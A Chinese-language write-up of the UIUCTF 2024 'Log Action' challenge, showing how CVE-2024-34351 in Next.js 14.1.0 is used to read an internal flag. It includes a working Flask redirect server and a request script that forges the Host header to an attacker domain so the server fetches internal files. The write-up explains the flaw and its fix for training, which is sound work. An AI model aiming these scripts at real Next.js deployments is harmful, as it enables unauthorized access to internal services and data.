# UIUCTF 2024 Log Action

## 题目简述

题目由同一 Docker 网络中的两个容器组成：对外开放的是 Next.js 前端，内部的 Nginx 后端把 flag 挂载为 `/usr/share/nginx/html/flag.txt`，却没有映射宿主机端口。目标是借前端发起服务端请求，读取只能通过容器名 `backend` 访问的文件。

前端将 Next.js 精确锁定在 `14.1.0`。该版本受 CVE-2024-34351 影响：处理 Server Action 的相对重定向时，Next.js 会根据客户端可控的 `Host` 构造一次服务端请求，由此形成可读取响应内容的 SSRF。

## 解题过程

### 找到稳定触发的相对重定向

登录动作最终也包含 `redirect("/admin")`，但正确密码每次都与新生成的随机值比较，正常情况下只会返回 `CredentialsSignin`。更直接的入口在公开可访问的 `/logout` 页面：

```tsx
<form
  action={async () => {
    "use server";
    await signOut({ redirect: false });
    redirect("/login");
  }}
>
  <button type="submit">Log out</button>
</form>
```

这段内联 Server Action 不要求用户已经登录。提交表单后，它会稳定执行相对重定向 `redirect("/login")`，恰好满足漏洞的触发条件。

Server Action 的 ID 是构建产物，不应把某次公开实例中的值当成常量。访问 `/logout`，提交一次 `Log out` 表单，然后在浏览器开发者工具的 Network 面板中复制请求，记录 `Next-Action` 头和对应的表单字段即可。

### 理解两阶段服务端取回

漏洞处理相对重定向时，会把原请求的 `Host` 与重定向路径组合成取回地址。若把 `Host` 改成攻击者服务器，`redirect("/login")` 就会使前端访问：

```text
https://attacker.example/login
```

Next.js 首先发送 `HEAD` 请求检查目标响应是否为 React Server Component；看到 `Content-Type: text/x-component` 后，再发送 `GET` 并把响应体作为 Server Action 的结果返回。攻击者可以让第一次检查通过，再让第二次请求重定向到内部服务：

```python
from flask import Flask, Response, redirect, request

app = Flask(__name__)

@app.route("/")
@app.route("/login")
def bounce():
    if request.method == "HEAD":
        response = Response("")
        response.headers["Content-Type"] = "text/x-component"
        return response
    return redirect("http://backend/flag.txt")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337)
```

这里的攻击者服务必须能从题目容器访问，并且外层转发要保留 `/login` 路径。`backend` 则是 `docker-compose.yml` 中的服务名，只有前端所在的 Docker 网络能够解析并访问它。

### 发送恶意 Server Action 请求

下面保留了浏览器提交 Server Action 时所需的 multipart 结构。`ACTION_ID` 必须替换成当前部署中捕获的值，`ATTACKER_HOST` 填写公网转发域名：

```python
import requests

TARGET = "https://logger.chal.uiuc.tf"
ATTACKER_HOST = "attacker.example"
ACTION_ID = "从当前部署的退出请求中提取"

headers = {
    "Next-Action": ACTION_ID,
    "Host": ATTACKER_HOST,
    "Origin": f"https://{ATTACKER_HOST}",
}
files = {
    f"1_$ACTION_ID_{ACTION_ID}": (None, ""),
    "0": (None, '["$K1"]'),
}

response = requests.post(
    f"{TARGET}/logout",
    headers=headers,
    files=files,
    timeout=20,
)
print(response.text)
```

`requests` 仍连接 `TARGET`，只是 HTTP 请求中的 `Host` 与 `Origin` 被改成攻击者域名。完整的数据流如下：

```text
POST /logout（伪造 Host）
  -> Server Action 执行 redirect("/login")
  -> 前端 HEAD https://attacker.example/login
  -> 攻击者返回 Content-Type: text/x-component
  -> 前端 GET https://attacker.example/login
  -> 攻击者 302 到 http://backend/flag.txt
  -> 前端跟随重定向，并把文件内容带回 Server Action 响应
```

最终响应中可读到：

```text
uiuctf{close_enough_nextjs_server_actions_welcome_back_php}
```

漏洞发现者的[技术分析](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps)给出了三项前提：存在 Server Action、动作重定向到以 `/` 开头的路径、客户端能够控制 `Host`。本题的 `/logout` 动作和直连部署逐项满足这些条件。GitHub 的[CVE-2024-34351 公告](https://github.com/advisories/GHSA-fr5h-rqp8-mj6g)将 `14.1.0` 列为受影响版本；Next.js 随后的[修复提交](https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085)不再信任原始 `Host`，而是使用框架保存的内部主机名构造取回地址。

## 方法总结

本题的决定性障碍是 Next.js Server Action 重定向取回中的任意响应读取 SSRF。关键不是猜中随机登录密码，而是发现无需认证的退出动作同样提供了稳定的相对重定向。

利用时还要区分两个阶段：`HEAD` 只负责通过 `text/x-component` 类型检查，真正的 `GET` 才通过 302 转向内部 Nginx。只搭一个普通重定向服务而忽略预检，Next.js 不会把目标内容带回。

修复时应升级到已修复的 Next.js 版本，并确保反向代理覆盖不可信的 `Host`。内部敏感服务仍应实施独立鉴权和网络隔离，不能仅依赖“没有映射公网端口”作为安全边界。
